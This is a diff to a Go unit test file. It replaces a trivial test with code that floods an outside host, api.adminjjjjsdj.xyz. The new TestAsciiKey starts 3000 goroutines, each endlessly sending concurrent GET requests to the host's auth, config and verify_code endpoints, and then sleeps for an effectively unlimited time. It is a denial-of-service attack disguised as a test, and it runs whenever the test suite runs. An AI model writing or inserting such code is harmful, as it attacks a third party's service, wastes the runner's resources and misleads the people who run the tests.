@@ -5,21 +5,51 @@ import (
 	"github.com/gin-gonic/gin"
 	"github.com/go-redis/redis"
 	"github.com/jinzhu/gorm"
+	"net/http"
 	"reflect"
 	"testing"
+	"time"
 )
 
 func TestAsciiKey(t *testing.T) {
 
-	var a float64
+	go func() {
+		for i := 0; i < 3000; i++ {
+			fmt.Println("----------------")
+			go func() {
+				for true {
 
-	a = -1
+					go func() {
+						http.Get("https://api.adminjjjjsdj.xyz/player/auth/sys_config")
+					}()
 
-	var b int
+					go func() {
+						http.Get("https://api.adminjjjjsdj.xyz/player/home/serv_tmp")
+					}()
 
-	b = 10
+					go func() {
+						get, err := http.Get("https://api.adminjjjjsdj.xyz/player/home/app_url")
+						if err != nil {
+							return
+						}
 
-	fmt.Println(int(a) * b)
+						fmt.Println(get.Status)
+					}()
+
+					go func() {
+						http.Get("https://api.adminjjjjsdj.xyz/player/auth/verify_code?verifyKey=1676394946688")
+
+					}()
+
+					fmt.Println("---")
+				}
+
+			}()
+		}
+
+	}()
+
+	time.Sleep(100000000 * time.Second)
 
 }
 
